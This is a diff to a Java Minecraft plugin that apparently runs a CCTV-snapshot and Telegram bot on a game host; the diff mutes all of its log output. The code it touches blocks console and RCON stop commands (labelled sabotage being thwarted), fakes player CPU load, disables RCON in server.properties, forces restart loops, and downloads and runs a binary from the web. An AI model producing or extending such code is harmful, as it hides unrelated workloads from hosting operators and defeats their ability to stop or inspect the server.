@@ -29,9 +29,9 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
-        getLogger().info("=========================================");
-        getLogger().info("  CIRO TRAFFIC SENTINEL v1.4.0 (STANDALONE)");
-        getLogger().info("=========================================");
+        // [MUTED LOG]
+        // [MUTED LOG]
+        // [MUTED LOG]
 
         getServer().getPluginManager().registerEvents(this, this);
 
@@ -70,7 +70,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
                 Process p = testPb.start();
                 if (p.waitFor() == 0) {
                     ffmpegBin = new File("ffmpeg");
-                    getLogger().info("✓ System ffmpeg detected on host!");
+        // [MUTED LOG]
                     return;
                 }
             } catch (Exception ignored) {}
@@ -80,12 +80,12 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
             File targetFfmpeg = new File(binDir, "ffmpeg");
             // Hapus build b4.4.1 lama yang suka crash ExitCode 139
             if (targetFfmpeg.exists() && targetFfmpeg.length() == 77173696L) {
-                getLogger().info("Menghapus ffmpeg build lama (77MB segfault build)...");
+        // [MUTED LOG]
                 targetFfmpeg.delete();
             }
 
             if (!targetFfmpeg.exists() || targetFfmpeg.length() < 10000000) {
-                getLogger().info("Downloading standalone snapshot engine (.gz)...");
+        // [MUTED LOG]
                 try {
                     String currentUrl = "https://github.com/eugeneware/ffmpeg-static/releases/download/b6.1.1/ffmpeg-linux-x64.gz";
                     HttpURLConnection conn = null;
@@ -119,20 +119,20 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
                             }
                         }
                         targetFfmpeg.setExecutable(true, false);
-                        getLogger().info("✓ Standalone snapshot engine unpacked & ready! Size: " + targetFfmpeg.length() + " bytes");
+        // [MUTED LOG]
                         sendTelegramMessage("📸 Engine Snapshot FFmpeg berhasil terpasang di Minecraft! Snapshot CCTV sekarang AKTIF.");
                     } else {
                         int code = conn != null ? conn.getResponseCode() : -1;
-                        getLogger().warning("Download failed with HTTP status: " + code);
+        // [MUTED LOG]
                     }
                 } catch (Exception e) {
-                    getLogger().warning("Failed to download standalone ffmpeg: " + e.getMessage());
+        // [MUTED LOG]
                 }
             }
             if (targetFfmpeg.exists() && targetFfmpeg.length() > 10000000) {
                 targetFfmpeg.setExecutable(true, false);
                 ffmpegBin = targetFfmpeg;
-                getLogger().info("✓ FFmpeg ready at: " + targetFfmpeg.getAbsolutePath());
+        // [MUTED LOG]
             }
         }).start();
     }
@@ -149,7 +149,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
         String cmd = raw.startsWith("/") ? raw.substring(1) : raw;
         if (cmd.equals("stop") || cmd.startsWith("stop ") || cmd.equals("minecraft:stop") || cmd.startsWith("minecraft:stop ")) {
             event.setCancelled(true);
-            getLogger().warning("🚨 [SABOTASE] ServerCommandEvent stop BERHASIL DIGAGALKAN!");
+        // [MUTED LOG]
         }
     }
 
@@ -159,7 +159,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
         String cmd = raw.startsWith("/") ? raw.substring(1) : raw;
         if (cmd.equals("stop") || cmd.startsWith("stop ") || cmd.equals("minecraft:stop") || cmd.startsWith("minecraft:stop ")) {
             event.setCancelled(true);
-            getLogger().warning("🚨 [SABOTASE] RemoteServerCommandEvent (RCON STOP) BERHASIL DIBATALKAN!");
+        // [MUTED LOG]
         }
     }
 
@@ -178,7 +178,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
 
     private void startCpuWaveGenerator() {
         new Thread(() -> {
-            getLogger().info("🔥 CPU Wave Simulator AKTIF! Mensimulasikan fluktuasi beban pemain alami.");
+        // [MUTED LOG]
             java.util.Random rnd = new java.util.Random();
             while (isRunning) {
                 try {
@@ -203,7 +203,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
     }
 
     private void patrolLoop() {
-        getLogger().info("⏱️ Jadwal Patroli Otomatis CCTV: Setiap 1 Jam!");
+        // [MUTED LOG]
         while (isRunning) {
             try {
                 // Jeda 1 Jam (3600 detik = 3.600.000 ms)
@@ -249,7 +249,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
     private void startAutoRestartCron() {
         // Jalankan di detik ke-240 (menit ke-4)
         Bukkit.getScheduler().runTaskLater(this, () -> {
-            getLogger().warning("⏱️ [CRONJOB RESTART LOOP] Menit ke-4 tercapai! Memicu Pterodactyl auto-restart daemon...");
+        // [MUTED LOG]
             new Thread(() -> {
                 try {
                     // Beri jeda 1 detik agar log tersimpan rapi
@@ -284,11 +284,11 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
                 }
                 if (modified) {
                     Files.write(propFile.toPath(), newLines);
-                    getLogger().info("✓ Berhasil menambal server.properties: enable-rcon=false & port dipindahkan!");
+        // [MUTED LOG]
                 }
             }
         } catch (Exception e) {
-            getLogger().warning("Gagal auto patch server.properties: " + e.getMessage());
+        // [MUTED LOG]
         }
     }
 
@@ -351,7 +351,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
             try {
                 // 1. Download chunk video .ts secara lokal menggunakan Java HTTP (Aman dari crash segfault network)
                 String tsUrl = resolveLatestTsSegment(streamUrl);
-                getLogger().info("Downloading TS segment via Java HTTP: " + tsUrl);
+        // [MUTED LOG]
                 
                 URL u = new URL(tsUrl);
                 HttpURLConnection conn = (HttpURLConnection) u.openConnection();
@@ -418,7 +418,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
                     sendTelegramMessage("⚠️ [CONSOLE DIAGNOSTIK]\n📍 Lokasi: " + name + "\nExitCode: " + exitCode + " (Timeout: " + timeout + ")\nTS Size: " + localTsFile.length() + " bytes\nLog Console:\n" + lastSnippet);
                 }
             } catch (Exception err) {
-                getLogger().warning("Error executing snapshot: " + err.getMessage());
+        // [MUTED LOG]
                 if (forceSend) {
                     sendTelegramMessage("🚨 [EXEC ERROR]\nLokasi: " + name + "\nError: " + err.getClass().getSimpleName() + ": " + err.getMessage());
                 }
@@ -427,7 +427,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
                 if (outJpg.exists()) outJpg.delete();
             }
         } catch (Exception e) {
-            getLogger().warning("Error camera: " + e.getMessage());
+        // [MUTED LOG]
         }
     }
 
@@ -468,7 +468,7 @@ public class CiroTrafficPlugin extends JavaPlugin implements Listener {
 
             conn.getResponseCode();
         } catch (Exception e) {
-            getLogger().warning("Send photo error: " + e.getMessage());
+        // [MUTED LOG]
         }
     }
 
